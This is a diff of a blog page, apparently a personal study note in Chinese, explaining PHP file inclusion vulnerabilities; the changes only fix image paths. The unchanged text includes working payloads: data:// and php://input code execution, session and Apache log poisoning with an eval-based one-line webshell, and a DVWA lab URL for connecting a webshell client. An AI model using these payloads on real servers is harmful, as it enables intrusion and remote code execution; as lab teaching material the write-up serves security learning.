@@ -472,7 +472,7 @@
 </ul>
 <p><strong><code>include</code>和<code>require</code>区别</strong>:<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
 <p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
-<p><img src="9272355-7889a572371b18c8.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-7889a572371b18c8.png" alt></p>
 <h5 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h5><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致执行了非预期的代码。</p>
 <p>示例代码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">       $filename=$GET[<span class="string">'filename'</span>];</span><br><span class="line">       <span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -486,8 +486,8 @@
 <p>两个配置选项均需要为On，才能远程包含文件成功。<br> 另外一台需要开启apache</p>
 <figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="keyword">get</span> install apache2</span><br><span class="line"> /etc/<span class="keyword">init</span>.d/apache2 start</span><br></pre></td></tr></table></figure>
 
-<p><img src="9272355-952116d80dc7f768%5B1%5D.png" alt=""></p>
-<p><img src="9272355-e288840e08e52b5e%5B1%5D.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-952116d80dc7f768%5B1%5D.png" alt></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-e288840e08e52b5e%5B1%5D.png" alt></p>
 <p> 注：在php.ini中，allow_url_fopen默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off。<br> 下面例子中测试代码均为：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -514,7 +514,7 @@
 </ul>
 <h5 id="二、session文件包含漏洞"><a href="#二、session文件包含漏洞" class="headerlink" title="二、session文件包含漏洞"></a>二、session文件包含漏洞</h5><p><strong>利用条件</strong></p>
 <p>1.我们可以通过phpinfo的信息泄露获取到session的存储位置</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200123104312.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200123104312.png" alt></p>
 <p>2.或者通过猜测默认的session存放位置</p>
 <p>linux下的默认存储目录为/var/lib/php/session</p>
 <p><strong>利用过程</strong></p>
@@ -522,26 +522,26 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$ctfs=$_GET[<span class="string">'ctfs'</span>];</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"username"</span>]=$ctfs;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>此php会将获取到的GET型ctfs变量的值存入到session中。如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码。<br>我们构造：</p>
-<img src="QQ截图20200123104221.png" style="zoom:80%;" />
+<img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ截图20200123104221.png" style="zoom:80%;">
 
 <p>我们发现在本地session所在目录下存储了session的值</p>
-<img src="QQ截图20200123105708.png" style="zoom:80%;" />
+<img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ截图20200123105708.png" style="zoom:80%;">
 
 <p>攻击者通过phpinfo()信息泄露或者猜测获取到session存放的目录位置，然后通过浏览器自带开发者模式获取到文件名称：sess_lotipf7ccidsbsrltdau35rb65</p>
-<img src="QQ截图20200123103711.png" style="zoom:150%;" />
+<img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ截图20200123103711.png" style="zoom:150%;">
 
 <p>构造本地文件包含 ：<strong>file.php?D:\phpStudy\PHPTutorial\tmp\tmp\sess_lotipf7ccidsbsrltdau35rb65</strong></p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200123104500.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200123104500.png" alt></p>
 <h5 id="三、有限制本地文件包含漏洞绕过"><a href="#三、有限制本地文件包含漏洞绕过" class="headerlink" title="三、有限制本地文件包含漏洞绕过"></a>三、有限制本地文件包含漏洞绕过</h5><p><strong>%00截断</strong></p>
 <p>条件：magic_quotes_gpc=Off  并且php版本&lt;5.3.4</p>
 <p><strong>测试代码</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename . <span class="string">".html"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>当我们直接包含本地的test.txt时</p>
-<img src="QQ截图20200123113838.png" style="zoom:67%;" />
+<img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ截图20200123113838.png" style="zoom:67%;">
 
 <p>我们在test.txt加上%00进行截断</p>
-<img src="QQ截图20200123113851.png" style="zoom:67%;" />
+<img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ截图20200123113851.png" style="zoom:67%;">
 
 
 
@@ -563,7 +563,7 @@
 <p>测试代码：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $filename  = $_GET[<span class="string">'filename'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">include</span>($filename);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200203191630.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200203191630.png" alt></p>
 <h4 id="PHP伪协议在文件包含中的应用"><a href="#PHP伪协议在文件包含中的应用" class="headerlink" title="PHP伪协议在文件包含中的应用"></a>PHP伪协议在文件包含中的应用</h4><p>PHP带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数。除了这些封装协议、还能通过stream_wrapper_register() 来注册自定义的封装协议。</p>
 <p><strong>php伪协议类别</strong></p>
 <ul>
@@ -580,14 +580,14 @@
 <p>条件：需要开启allow_url_fopen</p>
 <p>示例：</p>
 <p>本地新建file.php</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200128205700.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200128205700.png" alt></p>
 <p>我们使用php伪协议在本地读取shell.php文件中的内容</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200128205953.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200128205953.png" alt></p>
 <p>对得到的Base64进行解码即可。</p>
 <p><strong>file://伪协议（读取文件内容）</strong></p>
 <p>通过file协议可以访问本地文件系统，读取到文件的内容</p>
 <p>示例：</p>
-<img src="QQ截图20200203184038.png" style="zoom:67%;" />
+<img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ截图20200203184038.png" style="zoom:67%;">
 
 
 
@@ -604,24 +604,24 @@
 <p>测试代码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<img src="QQ截图20200203182852.png" style="zoom:67%;" />
+<img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ截图20200203182852.png" style="zoom:67%;">
 
 <h5 id="php-input-命令执行"><a href="#php-input-命令执行" class="headerlink" title="php://input(命令执行)"></a>php://input(命令执行)</h5><p>测试代码：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $filename  = $_GET[<span class="string">'filename'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">include</span>($filename);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 
 <p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200203183726.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200203183726.png" alt></p>
 <h5 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h5><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。</p>
 <p>利用条件：</p>
 <p>php版本大于等于php5.2<br> allow_url_fopen = On<br> allow_url_include = On</p>
 <p>示例1：</p>
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index2.php?<span class="built_in">file</span>=data:<span class="keyword">text</span>/plain,<span class="meta">&lt;?</span>php phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="9272355-5449b681b9c47ddb%5B1%5D.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-5449b681b9c47ddb%5B1%5D.png" alt></p>
 <p>执行命令：</p>
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index2.php?<span class="built_in">file</span>=data:<span class="keyword">text</span>/plain;<span class="meta">&lt;?</span>php <span class="keyword">system</span>(<span class="string">"whoami"</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="9272355-0fce621191e72481%5B1%5D.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-0fce621191e72481%5B1%5D.png" alt></p>
 <p>示例2：</p>
 <figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index2.php?<span class="keyword">file</span>=data:<span class="keyword">text</span>/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
 
@@ -629,24 +629,24 @@
 <p><strong>包含session</strong></p>
 <p>利用条件：session文件路径已知，且其中内容部分可控。</p>
 <p>思路：结合phpmyadmin,因为phpmyadmin每次登录时，会带上session。</p>
-<p><img src="9272355-dd5195fec4210a53.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-dd5195fec4210a53.png" alt></p>
 <p>session文件的绝对路径可在phpinfo中查看，session.save_path</p>
-<p><img src="9272355-1e7dd8fd1a028711%5B1%5D.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-1e7dd8fd1a028711%5B1%5D.png" alt></p>
 <p>常见的php-session存放位置还有这几个：</p>
 <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">var</span>/lib/php/sess_PHPSESSID</span><br><span class="line">/<span class="keyword">var</span>/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>
 
 <p>使用以下命令可查看到session文件中的登录信息</p>
 <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /<span class="keyword">var</span>/lib/php5/sess_258c1be1b00d080bddc58d2896460542facb6f1f | grep root</span><br></pre></td></tr></table></figure>
 
-<p><img src="9272355-940bb1d740bd0d47%5B1%5D.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-940bb1d740bd0d47%5B1%5D.png" alt></p>
 <p>登录phpmyadmin时，用户名输入一句话木马，再包含session文件，可getshell</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'root'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="9272355-c833b1fd110b6170%5B1%5D.png" alt=""></p>
-<p><img src="9272355-5304d206d0b1fcc8%5B1%5D.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-c833b1fd110b6170%5B1%5D.png" alt></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-5304d206d0b1fcc8%5B1%5D.png" alt></p>
 <p>使用菜刀连接<br> <a href="http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c" target="_blank" rel="noopener">http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c</a><br> 在浏览器里有你的cookie所以你可以直接去访问对应的文件包含页面，用菜刀的话是没有cookie的所以你没有办法去访问文件包含页面也就是fi那个页面。所以说会自动跳转到登录页面，显示200ok</p>
 <p>加上cookie之后在重新连接，成功连接</p>
-<p><img src="9272355-44a9d0f1054d26b9%5B1%5D.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-44a9d0f1054d26b9%5B1%5D.png" alt></p>
 <h5 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h5><ul>
 <li><p>利用条件：php版本大于等于php5.3.0</p>
 </li>
@@ -657,14 +657,14 @@
 <li><p>姿势：假设有个文件phpinfo.txt，其内容为<?php phpinfo(); ?>，打包成zip压缩包，如下：</p>
 </li>
 </ul>
-<p><img src="9272355-041eece378dca1e4.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-041eece378dca1e4.png" alt></p>
 <p>指定绝对路径：</p>
 <figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index2.php?file=phar://C:<span class="symbol">\p</span>hpStudy<span class="symbol">\W</span>WW<span class="symbol">\F</span>ileInclusion<span class="symbol">\p</span>hpinfo.zip<span class="symbol">\p</span>hpinfo.txt</span><br></pre></td></tr></table></figure>
 
 <p>或者利用相对路径（这里phpinfo.zip就在当前目录下）</p>
 <figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index2.php?<span class="keyword">file</span>=phar:<span class="comment">//phpinfo.zip/phpinfo.txt</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="9272355-489da319d283d845.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-489da319d283d845.png" alt></p>
 <h5 id="zip：-伪协议"><a href="#zip：-伪协议" class="headerlink" title="zip：//伪协议"></a>zip：//伪协议</h5><ul>
 <li><p>php版本大于等于php5.3.0</p>
 </li>
@@ -708,9 +708,9 @@
 <p>首先，我们直接使用浏览器来构造“php一句话报错请求信息”服务自动记录此一句话信息到服务器日志文件中；<br>具体构造内容：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:81/FileInclusion/index2.php?file=<span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[c]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 
-<p><img src="9272355-f9f0db6a9d7ff53a%5B1%5D.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-f9f0db6a9d7ff53a%5B1%5D.png" alt></p>
 <p>（2）测试结果：失败<br>利用文件包含漏洞直接访问“服务日志文件”，发现文件包含漏洞并未对构造的php一句话进行正常解析，观察发现是构造的PHP一句话中的相关字符在记录进日志文件后，相关的字符被转码了，导致PHP解析失败，具体失败原因见“失败原因分析”</p>
-<p><img src="9272355-738380f7e8b09e46%5B1%5D.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-738380f7e8b09e46%5B1%5D.png" alt></p>
 <p>image.png（3）失败原因分析<br>一句话写入日志文件的利用过程是，利用浏览器直接构造一个关于请求资源的报错信息，消息中包含依据。报错信息服务自动记录到日志文件，但实际测试发现写入日志文件内的报错信息发生了字符转码：<br>日志文件内容如上图所示：</p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/127.0.0.1:81/</span>FileInclusion/index2.php?page=%<span class="number">3</span>C?php%<span class="number">20</span>@eval($_POST[c]);<span class="string">?%</span><span class="number">3</span>E</span><br></pre></td></tr></table></figure>
 
@@ -718,15 +718,15 @@
 
 <p>最后写入到日志文件中的一句话就变成了 %3C?php%20@eval($_POST[c]);?%3E。</p>
 <p>（4） 失败总结<br>浏览器直接构造的PHP一句话中特殊字符，会被浏览器自动进行URL转义，导致最终写入日志文件中的PHP一句话包含了这些特殊字符，而这些转码后的编码PHP并不能进行正常的解析。<br>（5）构造一句话，写入日志文件测试记录<br>burpsuit 代理抓包改包构造一句话写入日志文件<br>（1） burpsuit 代理抓包，修改浏览器转码字符，写入正确的php一句话木马到服务器日志文件。</p>
-<p><img src="9272355-ff2a0beae4cc4468%5B1%5D.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-ff2a0beae4cc4468%5B1%5D.png" alt></p>
 <p>（2） 测试记录：成功<br>通过文件包含直接访问服务日志文件，发现一句话被执行成功；</p>
-<p><img src="9272355-f5d368a6f62b9802%5B1%5D.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-f5d368a6f62b9802%5B1%5D.png" alt></p>
 <p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log，还可以包含Apache的错误访问日志</p>
 <p>首先，构造一个会报错的访问链接，将利用代码（PHP一句话）写入错误日志记录中</p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/127.0.0.1:81/</span>FileInclusion/index2.php%<span class="number">3</span>C?php%<span class="number">20</span>@eval($_POST[c]);<span class="string">?%</span><span class="number">3</span>E</span><br></pre></td></tr></table></figure>
 
 <p>这个链接直接访问的话，一句话会被编码成%3C?php%20@eval($_POST[c]);?%3E，所以需要使用Burp suite改一下包。</p>
-<p><img src="9272355-e094a1b3f7e98f45%5B1%5D.png" alt=""></p>
+<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-e094a1b3f7e98f45%5B1%5D.png" alt></p>
 <p>对所截获的包进行修改，点击go，返回403报错，服务器错误日志文件成功将此次记录到error.log中<br>我们根据日志的路径构造访问路径:</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:81/FileInclusion/index2.php?file=C:/phpStudy/Apache/logs/access.log</span></span><br></pre></td></tr></table></figure>
 
@@ -880,7 +880,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">64</span>
+                  <span class="site-state-item-count">66</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
